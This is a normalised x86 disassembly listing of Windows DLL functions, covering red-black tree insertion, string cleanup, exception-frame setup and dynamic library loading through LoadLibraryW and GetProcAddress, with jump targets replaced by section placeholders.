jmp r-xdata
push 0x1
mov esi [ ebp + 0xc ]
mov [ ebp - 0x14 ] esi
lea ecx [ ebp - 0x14 ]
call sub_1002a8d0
mov edi [ ebp - 0x14 ]
cmp edi [ ebx ]
je r-xdata
mov eax [ esi + 0x8 ]
push [ ebp + 0x14 ]
push ecx
mov ecx ebx
cmp [ eax + 0xd ] 0x0
je r-xdata
mov ecx ebx
mov eax [ esi + 0x8 ]
push [ ebp + 0x14 ]
push ecx
mov ecx ebx
cmp [ eax + 0xd ] 0x0
jne r-xdata
lea eax [ edi + 0x10 ]
push eax
push [ ebp + 0x10 ]
call sub_10032c40
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
jmp r-xdata
push esi
push 0x0
jmp r-xdata
push edi
push 0x1
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push esi
call sub_10033b50
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10033800
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x6666665
jae r-xdata
push r--data
call sub_1003c5be
push [ ebp + 0x14 ]
call sub_10033f10
inc [ edi + 0x4 ]
mov ebx eax
mov ecx [ ebp + 0x10 ]
mov [ ebx + 0x4 ] ecx
mov edx [ edi ]
cmp ecx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ edx + 0x4 ] ebx
mov eax [ edi ]
mov [ eax ] ebx
mov eax [ edi ]
jmp r-xdata
mov [ ecx + 0x8 ] ebx
mov eax [ edi ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ecx ] ebx
mov eax [ edi ]
cmp ecx [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
mov eax ebx
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov [ eax ] ebx
jmp r-xdata
mov eax [ edi ]
pop edi
mov eax [ eax + 0x4 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop ebx
pop ebp
retn 0x14
push esi
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
cmp [ edx + 0xc ] 0x0
je r-xdata
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov [ edx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x8 ]
mov ecx [ esi ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx ]
mov ecx [ esi + 0x8 ]
mov [ edx ] ecx
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x4 ]
mov edx [ esi ]
cmp ecx edx
jne r-xdata
pop esi
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ ecx ] esi
jmp r-xdata
mov [ esi ] edx
mov [ ecx ] edx
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ ecx ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x4 ] esi
mov [ ecx + 0x8 ] edx
mov [ ecx ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_10033a10
push ebp
mov ebp esp
push 0xffffffff
push sub_100524d3
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x10 ]
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov [ esi + 0x2c ] 0xf
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push edi
mov [ esi ] 0x0
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10033ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_100524f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x40
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
push esi
call sub_1002a9d0
push edi
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
push edi
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_10033b50
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp eax 0x3fffffe
jae r-xdata
push [ ebp + 0x18 ]
call sub_10033a10
push r--data
call sub_1003c5be
mov ebx [ ebp + 0x18 ]
inc eax
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov ecx [ edi ]
cmp eax ecx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ecx + 0x4 ] ebx
mov eax [ edi ]
mov [ eax ] ebx
mov eax [ edi ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ edi ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ebx
mov ecx [ edi ]
cmp eax [ ecx ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ebx
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov [ ecx + 0x8 ] ebx
mov [ ecx ] ebx
jmp r-xdata
mov eax [ edi ]
pop edi
mov eax [ eax + 0x4 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop ebx
pop ebp
retn 0x14
push esi
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
cmp [ edx + 0xc ] 0x0
je r-xdata
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov [ edx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x8 ]
mov ecx [ esi ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xc ] 0x1
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0xc ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov esi [ edx ]
mov ecx [ esi + 0x8 ]
mov [ edx ] ecx
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x4 ]
mov edx [ esi ]
cmp ecx edx
jne r-xdata
pop esi
mov ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ edi ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ edi ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ ecx ] esi
jmp r-xdata
mov [ esi ] edx
mov [ ecx ] edx
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ ecx ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x4 ] esi
mov [ ecx + 0x8 ] edx
mov [ ecx ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_10033d60
push ebp
mov ebp esp
push 0xffffffff
push sub_10052510
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov edi [ ecx ]
mov esi [ edi + 0x4 ]
mov al 0x1
mov [ ebp - 0x14 ] al
mov ebx [ ebp + 0x10 ]
mov esi edi
mov [ ebp + 0xc ] esi
test al al
je r-xdata
mov edi esi
lea eax [ esi + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
lea eax [ esi + 0x10 ]
push eax
call sub_10032c40
push [ ebp + 0x14 ]
test al al
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
cmp edi [ eax ]
jne r-xdata
push eax
push ebx
call sub_10032c40
push ebx
push eax
call sub_10032c40
test al al
sete al
jmp r-xdata
call sub_10033a10
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push ecx
push edi
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1002ac90
mov esi [ ebp + 0xc ]
push [ ebp + 0x14 ]
push ecx
push edi
push 0x1
mov esi [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov [ ebp - 0x14 ] al
test al al
je r-xdata
lea eax [ ebp + 0xc ]
push eax
call sub_10033b50
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ esi + 0xd ] 0x0
jne r-xdata
sub_10033e80
push ebp
mov ebp esp
push 0xffffffff
push sub_10052543
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov [ esi + 0x2c ] 0xf
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10033f10
push ebp
mov ebp esp
push 0xffffffff
push sub_10052571
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
call sub_10033fd0
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov [ eax ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
call sub_100018b0
sub_10033fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x28
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
push esi
call sub_1002a9d0
push edi
lea eax [ esi + 0x4 ]
push eax
call sub_1002a9d0
push edi
lea eax [ esi + 0x8 ]
push eax
call sub_1002a9d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003c58d
sub_10034070
push ebp
mov ebp esp
push 0xffffffff
push sub_100525b8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100310d0
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100340f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052621
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
sub esp 0x3c
mov esi esp
mov [ ebp - 0x10 ] esp
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] esi
mov ecx esi
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x2c ]
push eax
lea ecx [ esi + 0x24 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ esi + 0x30 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_10030eb0
mov [ ebp - 0x4 ] 0x6
mov [ edi ] r--data
mov [ edi + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_100047b0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x3c
sub_100341e0
cmp [ rw-data ] 0x0
push edi
mov edi ecx
jne r-xdata
mov eax [ rw-data ]
push eax
call [ LoadLibraryW@IAT ]
mov [ edi + 0x3c ] eax
test eax eax
jne r-xdata
mov ecx 0xf
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
pop edi
retn
mov eax [ rw-data ]
push eax
push [ edi + 0x3c ]
call [ GetProcAddress@IAT ]
xor ecx ecx
mov [ edi + 0x40 ] eax
test eax eax
pop edi
setne cl
mov eax ecx
retn
mov ecx 0x5d
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
sub_10034260
push ebp
mov ebp esp
push 0xffffffff
push sub_100526b6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0xb0 ] ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x24 ]
mov [ ebp - 0xbc ] esi
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0xa8 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ rw-data ]
sub esp 0x18
mov edx esp
mov [ ebp - 0xac ] esp
xor eax eax
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ edi ] ax
jne r-xdata
mov ecx 0x10
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx edi
lea eax [ ecx + 0x2 ]
mov [ ebp - 0xb8 ] eax
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0xb8 ]
sar ecx 0x1
push ecx
push edi
mov ecx edx
call sub_10009730
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xa4 ]
call sub_1003baa0
mov [ ebp - 0x4 ] 0x3
sub esp 0x18
mov ecx esp
mov [ ebp - 0xac ] esp
xor eax eax
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push r--data
mov [ ecx ] ax
call sub_10009730
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0xa4 ]
call sub_1003bc50
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push eax
push esi
call sub_100311f0
mov [ ebp - 0xa8 ] 0x1
jmp r-xdata
mov edi [ rw-data ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x28 ]
call sub_100050b0
cmp [ edi ] 0x0
jne r-xdata
mov ecx 0x5e
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xa4 ]
call sub_1003bb90
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ ebp - 0x28 ]
call sub_10005470
mov edi [ ebp - 0xb0 ]
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0xb4 ]
mov ecx edi
call sub_100318a0
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0xac ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x40 ]
call sub_1003bfd0
add esp 0x18
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0xa4 ]
call sub_1000ba30
mov ecx eax
mov [ ebp - 0x4 ] 0x8
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
call [ GetLastError@IAT ]
push eax
push esi
call sub_100311f0
mov [ ebp - 0xa8 ] 0x1
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8
lea eax [ ebp - 0x40 ]
push 0x0
cmovae eax [ ebp - 0x40 ]
push 0x0
push ecx
push eax
mov eax [ edi + 0x40 ]
push 0x0
call eax
mov edi eax
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x44 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
test edi edi
je r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
push ecx
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0xa4 ]
call sub_1003be00
mov [ ebp - 0x4 ] 0x9
push eax
push esi
call sub_10031f80
mov [ ebp - 0xa8 ] 0x1
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
movzx eax di
push eax
push esi
call sub_100311f0
mov [ ebp - 0xa8 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
push [ ebp - 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10034600
push ebp
mov ebp esp
push 0xffffffff
push sub_1005008b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0x24 ]
mov eax [ edi + 0x4 ]
lea esi [ edi + 0x24 ]
mov [ esi - 0x24 ] r--data
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov [ esi ] r--data
je r-xdata
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_100346b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100500bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x20 ]
mov [ esi - 0x24 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x20 ]
mov [ edx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
